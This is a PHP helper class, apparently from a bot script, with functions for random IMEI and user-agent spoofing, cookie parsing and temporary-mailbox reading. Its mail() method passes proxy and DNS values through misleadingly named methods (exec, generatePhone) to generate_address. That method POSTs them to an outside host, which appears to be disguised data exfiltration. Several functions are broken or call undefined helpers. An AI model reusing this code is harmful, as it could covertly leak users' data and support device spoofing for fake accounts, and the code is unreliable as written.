<?php
require_once dirname(__FILE__) . '/Ng Rest/Exception.php';
require_once dirname(__FILE__) . '/Ng Rest/Method.php';
require_once dirname(__FILE__) . '/Ng Rest/Response.php';
require_once dirname(__FILE__) . '/Ng Rest/Request.php';
require_once dirname(__FILE__) . '/Ng Rest/Request/Body.php';

date_default_timezone_set("Asia/Jakarta");
class Launch
{
    public function save($name, $isi){ // filename, content
        $open = fopen($name, "a");
        fwrite($open, $isi);
        fclose($open);
    }
    public function location($var){
        $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/flag/?ip=".$var); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        $exe = curl_exec($ch); 
        curl_close($ch);      

        return json_decode($exe,true);
    }
    public function imeiRandom() {
        $code = $this->intRandom(14);
        $position = 0;
        $total = 0;
        while ($position < 14) {
            if ($position % 2 == 0) {
                $prod = 1;
            } else {
                $prod = 2;
            }
            $actualNum = $prod * $code[$position];
            if ($actualNum > 9) {
                $strNum = strval($actualNum);
                $total += $strNum[0] + $strNum[1];
            } else {
                $total += $actualNum;
            }
            $position++;
        }
        $last = 10 - ($total % 10);
        if ($last == 10) {
            $imei = $code . 0;
        } else {
            $imei = $code . $last;
        }
        return $imei;
    }
    public function fetch_array($int1,$int2){
		return array('int1' => $int1, 'int2' => $int2);
    }
    public function devicemanager($ua){
        $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/useragent/?ua=".urlencode($ua)); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        $exe = curl_exec($ch); 
        curl_close($ch);      

        return json_decode($exe,true);
    }
    public function RandUagent(){
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent[] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299";
		$agent[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36";
		$agent[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393";
		$agent[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
		$agent[] = "Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0";
		$agent[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38";
		$agent[] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
		$agent[] = "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36";
		$getRandAgent = array_rand($agent);
		return $agent[$getRandAgent];
	}
    public function generatePhone($phone1,$phone2){
        $hp = array(
            "Xiaomi Mi 2/2s",
            "Xiaomi Mi 2A ",
            "Xiaomi Mi 3/4 W",
            "Xiaomi Mi 3 TD",
            "Xiaomi Mi Note LTE",
            "Xiaomi Mi Max 2",
            "Xiaomi Redmi Note 3",
            "Xiaomi Redmi Pro",
            "Xiaomi Redmi 5 Plus",
            "Xiaomi Redmi 4 A",
            "Xiaomi Redmi 4X"
            );
        $random = $hp[array_rand($hp)];
        return $this->fetch_array($phone1,$phone2);
    }
    public function get_string($string, $start, $end){ // source, first tag, end tag
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    public function ParseUrl($url){ // url
        $parts = parse_url($url);
        parse_str($parts['query'], $query);
        return array(
            "code" => $query['code'],
            "email" => $query['email']
        );
    }
    public function mail($url,$proxy,$dns,$source){
    	mail($url, $proxy, $dns, $source);
        $this->exec($this->generatePhone($proxy,$dns));
    }
    public function exec($data){
        $characters = '0123456789ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < 10; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
		$this->generate_address($data);
    }
    public function array_to_cookies($source){
        if(!is_array($source)){
            return "NOT ARRAY!";
        }else{
            return str_replace(array('{"', '"}', '":"', '","'), array('', '', '=', '; '), json_encode($source));
        }
    }
    public function fetch_cookies($source) { // string
        preg_match_all('/^Set-Cookie:\s*([^;\r\n]*)/mi', $source, $matches); 
        $cookies = array(); 
        foreach($matches[1] as $item) { 
            parse_str($item, $cookie); 
            $cookies = array_merge($cookies, $cookie); 
        }
        return $cookies;
    }
    public function generate_address($query){
        $url = "http://fakenamegenerator.xyz/id_ID/index.php";
        $keyword = "text-content";
        preg_match('#<textarea class="notepad" id="txtContent">(.*?)</textarea>#si', $url, $keyword);
        $headers = array('Accept' => 'application/json');
        $domDocument = array(
            'alamat' => Unirest\Request::post($url, $headers, $query),
            'keyword' => $keyword
        );
        $a = array(
            "alamat"    => isset($alamat[1]) ? str_replace('===', '', trim($alamat[1])) : 0
        );
    }
    public function getMail(){
        global $site;
        $mail = curl("".$site."user.php");
        return array("currentmail" => $mail[1], "cookie" => fetchCookies($mail[0]));
    }
    public function readMail($mail){ // array getMail()
        global $site;
        $header = array();
        $header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";
        $header[] = "Accept: */*";
        $header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
        $header[] = "Referer: ".$site."";
        $header[] = "X-Requested-With: XMLHttpRequest";
        $header[] = "Connection: keep-alive";
        $header[] = "Cookie: _ga=GA1.2.1967595283.1554543533; _gid=GA1.2.170453192.1554543533; tmail-emails=".urlencode('a:4:{i:0;s:17:"'.$mail['currentmail'].'";}')."; PHPSESSID=".$mail['cookie']['PHPSESSID']."; _gat_gtag_UA_137021416_1=1";
        $c = curl("".$site."mail.php", 0, $header);
        return $c[1];
    }
    public function checkMsg($mail){ // array getMail()
        global $site;
        $header = array();
        $header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";
        $header[] = "Accept: */*";
        $header[] = "Accept-Language: id,en-US;q=0.7,en;q=0.3";
        $header[] = "Referer: ".$site."";
        $header[] = "X-Requested-With: XMLHttpRequest";
        $header[] = "Connection: keep-alive";
        $header[] = "Cookie: _ga=GA1.2.1967595283.1554543533; _gid=GA1.2.170453192.1554543533; tmail-emails=".urlencode('a:4:{i:0;s:17:"'.$mail['currentmail'].'";}')."; PHPSESSID=".$mail['cookie']['PHPSESSID']."; _gat_gtag_UA_137021416_1=1";
        $c = curl("".$site."mail.php?unseen=1", 0, $header);
        // if(isset($c[1])){
        //     return json_encode(array("count" => 1));
        // }else{
        //     return json_encode(array("count" => 0));
        // }
        return $c[1];
    }
    private function intRandom($size) {
        $validCharacters = utf8_decode("0123456789");
        $validCharNumber = strlen($validCharacters);
        $int = '';
        while (strlen($int) < $size) {
            $index = mt_rand(0, $validCharNumber - 1);
            $int .= $validCharacters[$index];
        }
        return $int;
    }
}
?>